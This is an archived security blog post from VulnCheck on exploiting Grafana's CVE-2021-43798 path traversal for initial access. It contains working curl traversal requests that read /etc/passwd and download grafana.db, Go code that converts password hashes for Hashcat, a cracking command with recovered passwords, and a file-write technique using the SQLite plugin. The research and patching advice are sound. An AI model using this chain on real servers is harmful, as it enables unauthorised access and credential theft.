---
title: "Assessing Potential Exploitation of Grafanas CVE-2021-43798 for Initial Access - Blog - VulnCheck"
date: 2023-02-21T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# Assessing Potential Exploitation of Grafanas CVE-2021-43798 for Initial Access - Blog - VulnCheck

<br/>

<br/>
\## Overview\\n\\nGrafana is a data visualization web application used by thousands of companies, including SalesForce, JPMorgan Chase, Cisco, and \[more\](https://grafana.com/success/?technology=grafana). That’s likely why there was a lot of interest when \[CVE-2021-43798\](https://nvd.nist.gov/vuln/detail/CVE-2021-43798) was \[posted\](https://web.archive.org/web/20211203190716/https://twitter.com/j0v0x0/status/1466845212626542607) to Twitter as a zero-day on December 3, 2021. \\n\\n::check-list\\n---\\ntitle: Key Takeaways\\nico: mdi:check-bold\\nlist:\\n - CVE-2021-43798 was a zero-day for only a short time. Grafana released an official patch on December 7, 2021, just before the Log4Shell hysteria re-prioritized security teams’ remediation efforts.\\n - Over a year later, 7,500 or 8% of Grafana instances indexed by Shodan remain vulnerable.\\n - We looked at a file disclosure vulnerability affecting Grafana and examined how this issue might be used to gain additional access to the affected system.\\n - Exfiltrating the Grafana SQLite database allows attackers to extract password hashes, brute-force them, and, potentially, establish administrative access on the system.\\n - We recommend patching this vulnerability as soon as possible. If your Grafana server was ever affected by this vulnerability, and exposed to the internet, we also recommend rotating all passwords (data source passwords included).\\n---\\n::\\n\\n## Details\\n\\nCVE-2021-43798 allowed a remote and unauthenticated attacker to read arbitrary files on a Grafana server using a simple HTTP request:\\n\\n\`\`\`sh\\nalbinolobster@mournland:~$ curl --path-as-is http://10.9.49.222:3000/public/plugins/welcome/../../../../../../../../etc/passwd\\nroot:x:0:0:root:/root:/bin/ash\\nbin:x:1:1:bin:/bin:/sbin/nologin\\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\\nadm:x:3:4:adm:/var/adm:/sbin/nologin\\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\\nsync:x:5:0:sync:/sbin:/bin/sync\\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\\nhalt:x:7:0:halt:/sbin:/sbin/halt\\nmail:x:8:12:mail:/var/mail:/sbin/nologin\\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\\noperator:x:11:0:operator:/root:/sbin/nologin\\nman:x:13:15:man:/usr/man:/sbin/nologin\\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\\ngames:x:35:35:games:/usr/games:/sbin/nologin\\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\\nguest:x:405:100:guest:/dev/null:/sbin/nologin\\nnobody:x:65534:65534:nobody:/:/sbin/nologin\\ngrafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin\\n\`\`\`\\n\\nThe example above shows an attacker reading \`/etc/passwd\` from the victim Grafana. Reading \`/etc/passwd\` is essentially useless for an attacker, but VulnCheck has archived a large number of public CVE-2021-43798 exploits that do exactly that. Those exploits are useless, for anything other than vulnerability scanners and \[bug bounty hunters\](https://hackerone.com/reports/1419213), because they don’t demonstrate a real security impact.\\n\\n\*\*Some\*\* public CVE-2021-43798 exploits have tried to demonstrate real impact. \[Metasploit\](https://github.com/rapid7/metasploit-framework/blob/6727c1b344382fe2e56bb2a1c4343b09e40b64c8/modules/auxiliary/scanner/http/grafana\_plugin\_traversal.rb), for example, uses CVE-2021-43798 to download the server’s \`grafana.ini\` \[configuration file\](https://github.com/grafana/grafana/blob/main/conf/defaults.ini). \`grafana.ini\` can potentially leak interesting secrets (e.g. \[Okta OAuth2\](https://grafana.com/docs/grafana/latest/setup-grafana/configure-security/configure-authentication/okta/) configuration), but a standard install using a default configuration is almost entirely devoid of anything useful to an attacker.\\n\\nCVE-2021-43798 was a zero-day for only a short time. Grafana released an official patch on December 7, 2021. A couple of days later, the security industry became lost to the hysteria of \[Log4Shell\](https://en.wikipedia.org/wiki/Log4Shell​​), and CVE-2021-43798 was pushed to the backburner before fading into obscurity.\\n\\nBut, a bit over a year later, thousands of servers remain vulnerable to CVE-2021-43798. A review of the approximately \[95,000\](https://www.shodan.io/search?query=title%3A%22Grafana%22) Grafana instances indexed by Shodan found that 7,500 (about 8%) are still vulnerable.\\n\\n> Vulnerable Internet-Facing Grafana Instances\\n\\n::bar-chart\\n---\\nlabels:\\n - 8.0.0\\n - 8.0.1\\n - 8.0.2\\n - 8.0.3\\n - 8.0.4\\n - 8.0.5\\n - 8.0.6\\n - 8.1.0\\n - 8.1.1\\n - 8.1.2\\n - 8.1.3\\n - 8.1.4\\n - 8.1.5\\n - 8.1.6\\n - 8.1.7\\n - 8.2.0\\n - 8.2.1\\n - 8.2.2\\n - 8.2.3\\n - 8.2.4\\n - 8.2.5\\n - 8.2.6\\n - 8.3.0\\nvalues:\\n - 213\\n - 121\\n - 143\\n - 482\\n - 352\\n - 321\\n - 687\\n - 180\\n - 401\\n - 729\\n - 270\\n - 107\\n - 518\\n - 120\\n - 58\\n - 255\\n - 440\\n - 577\\n - 526\\n - 186\\n - 447\\n - 206\\n - 296\\n---\\n::\\n\\nCVE-2021-43798 has never been publicly linked to a named adversary. You won’t find it in any threat group reports, botnet rundowns, or the \[CISA KEV Catalog\](https://www.cisa.gov/known-exploited-vulnerabilities-catalog). But it does appear to be actively exploited. \[FortiGuard Labs IP Threat Encyclopedia\](https://www.fortiguard.com/encyclopedia/ips/51075) shows hundreds of CVE-2021-43798 exploitation attempts pers day. \[Greynoise\](https://viz.greynoise.io/query/?gnql=raw\_data.web.paths%3A%22%2Fpublic%2Fplugins%2F%22%20classification%3Amalicious) also shows a number of malicious IP addresses probing for vulnerable hosts:\\n\\n!\[Grafana Probes\](/blog/grafana-cve-2021-43798/greynoise-grafana.png){:width="100%"}\\n\\nWith thousands of vulnerable servers and, what appears to be, active probing for the vulnerability, it left us wondering if there was more to this vulnerability. At VulnCheck, our \[Initial Access\](https://vulncheck.com/product/initial-access-intelligence) program has had decent success chaining information leak vulnerabilities with authenticated attacks to achieve initial access. Could CVE-2021-43798 be one of those useful information leaks?\\n\\n## Finding a More Useful Information Leak\\n\\nAs mentioned, early exploits leaked \`/etc/passwd\` and \`/etc/grafana/grafana.ini\` (or a variant of that path), but they weren’t likely to be useful for establishing initial access to the Grafana system. Another early suggestion was to leak SSH keys, but that isn’t a realistic target either. A secure Grafana install will be executed as a low-privileged \`grafana\` user. Access to SSH keys shouldn’t be possible, and, even if it was, there is little reason for a Grafana server to contain any useful SSH \*private\* keys.\\n\\nThere is \[one\](https://nusgreyhats.org/posts/writeups/a-not-so-deep-dive-in-to-grafana-cve-2021-43798/) early writeup that discuss exfiltrating the SQLite database that backs Grafana. An SQLite database is just a file, so an attacker using CVE-2021-43798 can grab a copy of the database. As you can see below, the database contains a bunch of interesting looking tables.\\n\\n\`\`\`sh\\nalbinolobster@mournland:~$ curl -o grafana.db --path-as-is http://10.9.49.222:3000/public/plugins/welcome/../../../../../../../../var/lib/grafana/grafana.db\\n % Total % Received % Xferd Average Speed Time Time Time Current\\n Dload Upload Total Spent Left Speed\\n100 3544k 100 3544k 0 0 627k 0 0:00:05 0:00:05 --:--:-- 662k\\nalbinolobster@mournland:~$ sqlite3 grafana.db\\nSQLite version 3.31.1 2020-01-27 19:55:54\\nEnter ".help" for usage hints.\\nsqlite> .tables\\nalert login\_attempt \\nalert\_configuration migration\_log \\nalert\_instance ngalert\_configuration \\nalert\_notification org \\nalert\_notification\_state org\_user \\nalert\_rule playlist \\nalert\_rule\_tag playlist\_item \\nalert\_rule\_version plugin\_setting \\nannotation preferences \\nannotation\_tag quota \\napi\_key server\_lock \\ncache\_data session \\ndashboard short\_url \\ndashboard\_acl star \\ndashboard\_provisioning tag \\ndashboard\_snapshot team \\ndashboard\_tag team\_member \\ndashboard\_version temp\_user \\ndata\_source test\_data \\nkv\_store user \\nlibrary\_element user\_auth \\nlibrary\_element\_connection user\_auth\_token \\nsqlite>\\n\`\`\`\\n\\nThe aforementioned write-up focuses on the \`data\_source\` table. That seems like an odd choice when there are other juicy looking table names like \`user\_auth\_token\`, \`api\_key\`, and \`session\`. But, it turns out that Grafana does an excellent job of hashing sensitive data with large random values to make it “impossible” for attackers to quickly recover credentials. The sole exception appears to be the data stored in the \`data\_source\` table.\\n\\nGrafana, being a data visualization tool, needs external sources of data, such as databases. Grafana needs to know how to authenticate with those databases. Those credentials are stored encrypted (but easily unencrypted) in the \`data\_source\` table.\\n\\nWithout going into specifics (I’d suggest reading the linked, \*A (not so deep) Dive into Grafana CVE-2021-43798\*, if you are interested), attackers that can access the \`grafana.ini\` file and \`data\_source\` table, can trivially decrypt the passwords to Grafana’s external data sources. That’s quite interesting, but likely has three significant drawbacks from an initial access perspective:\\n\\n1. The data sources are less likely to be directly reachable over the internet. Exposing Grafana to the internet is unwise, but likely done intentionally. To expose a production database to the internet is a grave error. The expectation is that many data sources won’t be remotely accessible by an attacker from the internet.\\n2. Even if the attacker can reach the data source, only certain types of data sources are going to be useful for initial access purposes. For example, the attacker would welcome access to a PostgreSQL database because it contains features that might allow an attacker to execute arbitrary OS commands. But a Grafana whose only data source is CloudWatch won’t offer that same type of functionality.\\n3. Finally, let’s say an attacker can access a PostgreSQL data source. Grafana tells administrators to provide low-privileged/read-only access to Grafana for security reasons. A properly configured account will block Grafana from abusing the command execution feature.\\n\\nSo while \`data\_source\` is interesting (and even featured on a \[HackTheBox\](https://www.hackthebox.com/) target). The drawbacks are too significant.\\n\\n## Guessing Credentials\\n\\nInstead, we thought another table offered more realistic chances for obtaining additional access. Unsurprisingly, it’s the \`user\` table. The \`user\` table contains usernames, hashed passwords, and salts:\\n\\n\`\`\`\\nsqlite> select \* from user;\\nid|version|login|email|name|password|salt|rands|company|org\_id|is\_admin|email\_verified|theme|created|updated|help\_flags1|last\_seen\_at|is\_disabled\\n1|0|admin|admin@localhost||e21680070fb3a72d8cac29819eb74ddbee669a9d362dea5c4674d8287e4a1df22424fcdd00ab0cc8230d4249296adc2adca8|NcgfTdzwPc|wXslOqTqT0||1|1|0||2023-02-09 23:12:45|2023-02-13 21:25:51|0|2023-02-13 21:25:26|0\\n2|0|viewer|viewer|Jake|18e6160a5e7e03a7dea259195b27543c2d1b515e4490867c73ffb6214d08f77163ecc0f58321a40deb300ec563c15a327733|13CdHYK4Xl|z5w6xlWQWI||1|0|0||2023-02-10 18:02:31|2023-02-13 21:27:21|0|2023-02-13 21:26:56|0\\n3|0|ro|ro|ro|20ae2e2828c004ef4638f6d490a23aa9956cc4bfeb1db60abd18930f97099782037c6861518b466e20addc36dfda5f564d78|bhhVgTns9o|w2lzkKgwWN||1|0|0||2023-02-10 18:17:14|2023-02-13 21:26:39|0|2023-02-13 21:26:24|0\\n\`\`\`\\n\\nThe hashes are created using PBKDF2-HMAC-SHA256. See lines 145-148 of \[grafana/blob/main/pkg/util/encryption.go\](https://github.com/grafana/grafana/blob/main/pkg/util/encryption.go#L145):\\n\\n\`\`\`go\\n// Key needs to be 32bytes\\nfunc encryptionKeyToBytes(secret, salt string) (\[\]byte, error) {\\n return pbkdf2.Key(\[\]byte(secret), \[\]byte(salt), 10000, 32, sha256.New), nil\\n}\\n\`\`\`\\n\\nPBKDF2-HMAC-SHA256 is an algorithm understood by \[Hashcat\](https://hashcat.net/hashcat/), the password cracking tool. The Grafana user table just needs to be transformed into a format that Hashcat can read. This is achieved with a small amount of Go:\\n\\n\`\`\`go\\n// grab the usernames, passwords and salts from the downloaded db\\nrows, err := db.Query("select email,password,salt,is\_admin from user")\\nif err != nil {\\n return\\n}\\ndefer rows.Close()\\n\\nfor rows.Next() {\\n var email string\\n var password string\\n var salt string\\n err = rows.Scan(&email, &password, &salt)\\n if err != nil {\\n return false\\n }\\n\\n decoded\_hash, \_ := hex.DecodeString(password)\\n hash64 := b64.StdEncoding.EncodeToString(\[\]byte(decoded\_hash))\\n salt64 := b64.StdEncoding.EncodeToString(\[\]byte(salt))\\n \_, \_ = hash\_file.WriteString("sha256:10000:" + salt64 + ":" + hash64 + "\\n")\\n}\\n\`\`\`\\n\\nThe example code above will transform the previously shown \`user\` table into the following Hashcat-ingestable hashes:\\n\\n\`\`\`\\nsha256:10000:TmNnZlRkendQYw==:4haABw+zpy2MrCmBnrdN2+5mmp02LepcRnTYKH5KHfIkJPzdAKsMyCMNQkkpatwq3Kg=\\nsha256:10000:MTNDZEhZSzRYbA==:GOYWCl5+A6feolkZWydUPC0bUV5EkIZ8c/+2IU0I93Fj7MD1gyGkDeswDsVjwVoydzM=\\nsha256:10000:YmhoVmdUbnM5bw==:IK4uKCjABO9GOPbUkKI6qZVsxL/rHbYKvRiTD5cJl4IDfGhhUYtGbiCt3Dbf2l9WTXg=\\n\`\`\`\\n\\nAt this point, it’s useful to know that Grafana \[doesn’t enforce\](​​https://community.grafana.com/t/minimum-password-requirements/62819) any type of password complexity requirements. The sole requirement is that a password must be four characters or longer. The likelihood of a bad password is quite high. As a contrived example, we provide the hashes from our test Grafana server to Hashcat along with a standard password dictionary, and recover two passwords:\\n\\n\`\`\`sh\\nalbinolobster@mournland:~$ hashcat -m 10900 10.9.49.222\_3000\_hashes.txt rockyou.txt -o cracked.out\\nalbinolobster@mournland:~$ cat cracked.out\\nsha256:10000:YmhoVmdUbnM5bw==:IK4uKCjABO9GOPbUkKI6qZVsxL/rHbYKvRiTD5cJl4IDfGhhUYtGbiCt3Dbf2l9WTXg=:password\\nsha256:10000:TmNnZlRkendQYw==:4haABw+zpy2MrCmBnrdN2+5mmp02LepcRnTYKH5KHfIkJPzdAKsMyCMNQkkpatwq3Kg=:iloveyou\\n\`\`\`\\n\\nExfiltrating the SQLite database, extracting password hashes, and cracking them seems to be a reasonable approach for gaining access into the Grafana Web UI. To me, this is obviously better than exfiltrating \`grafana.ini\` and likely better than focusing on the \`data\_source\` table.\\n\\n## Expanding Access\\n\\nThe obvious question now is, “What do Web UI credentials get me?” Surprisingly, even with an admin account, not much. We did solve one problem. The Grafana server should have access to all data source servers, so we should be able to proxy attacks (e.g. PostgreSQL command execution) through the Grafana server. But otherwise, a lot of administrative functionality is built into the Grafana CLI tool and excluded from the web interface (as we can see, rightly so). There is one useful feature an administrator has access to in the web UI: installing plugins from the \[Grafana Catalog\](https://grafana.com/grafana/plugins/).\\n\\nOne plugin that proves useful is the SQLite plugin.\\n\\n!\[Grafana Probes\](/blog/grafana-cve-2021-43798/grafana-sqlite-plugin.png){:width="100%"}\\n\\nThis blog is centered around exfiltrating Grafana’s SQLite database. Exfiltration with CVE-2021-43798 gave us read access to the database. The SQLite plugin gives us full write access to the Grafana database.\\n\\n!\[Grafana SQLite Data Source\](/blog/grafana-cve-2021-43798/sqlite-data-source.png){:width="100%"}\\n\\nBeing able to arbitrarily modify the Grafana database doesn’t lead to any obvious code execution opportunities (that we saw). But SQLite has a couple of interesting features that could potentially result in code execution. The first feature we looked at was \`load\_extension\`. This \[function\](https://www.sqlite.org/lang\_corefunc.html#load\_extension) could allow us to load and execute a shared object. However, the Grafana plugin has this feature disabled:\\n\\n!\[Grafana Load Extension Attempt\](/blog/grafana-cve-2021-43798/load-extension.png){:width="100%"}\\n\\nThe other potentially abusable SQLite feature is an arbitrary file write using \`attach database\`. The \[created file\](https://www.sqlite.org/lang\_attach.html) will be an sqlite3 database, but others have achieved code execution with this method by targeting loose file formats (e.g. PHP). Grafana is largely Go-based (and has no association with PHP) but we can at least establish the arbitrary file write works. Below we attempt to make the file \`/var/lib/grafana/plugins/frser-sqlite-datasource/img/vulncheck.html\`:\\n\\n!\[Grafana File Write Query\](/blog/grafana-cve-2021-43798/sqlite-write-primitive.png){:width="100%"}\\n\\nThe write is successful. We know this because we can fetch the file over HTTP.\\n\\n!\[Grafana Write Success\](/blog/grafana-cve-2021-43798/write-success.png){:width="100%"}\\n\\nThe Grafana SQLite plugin gives us a write primitive on the server itself. However, assuming Grafana is running as the \`grafana\` user, there aren't a lot of places an attacker can actually write to. \`grafana\` is largely limited to the \`/var/lib/grafana/plugins/\` directory tree where all the Grafana plugins are stored. Plugins are a mix of Go, JavaScript, HTML, and CSS, so there is opportunity to modify plugins to further expand our reach on the system. Although, that’s an exercise we’ll leave for another time.\\n\\nOf course, the attacker code just drop all tables and destroy the system. 🤷\\n\\n## Conclusion\\n\\nIn this blog, we looked at a file disclosure vulnerability affecting Grafana and examined how this issue might be used to gain additional access to the affected system. Exfiltrating the Grafana SQLite database allows attackers to extract password hashes, brute-force them, and, potentially, establish administrative access on the system. Administrative access gives the attacker write access to the underlying SQLite database via a plugin. In turn, the write access gives the attacker the ability to write files to the underlying filesystem (or destroy the database).\\n\\nBrute forcing passwords can take a long time. A very long time. But once cracked, the attacker has that password forever. If your Grafana server was ever affected by this vulnerability, and exposed to the internet, it would be wise to rotate all passwords (data source passwords included).\\n\\n\\nVulnCheck tracks vulnerabilities and their exploits. We pride ourselves in knowing which vulnerabilities matter. For more information, \[register\](https://vulncheck.com/register) for a VulnCheck account today.\\n

#### [Source](https://vulncheck.com/blog/grafana-cve-2021-43798)

<br/>
---
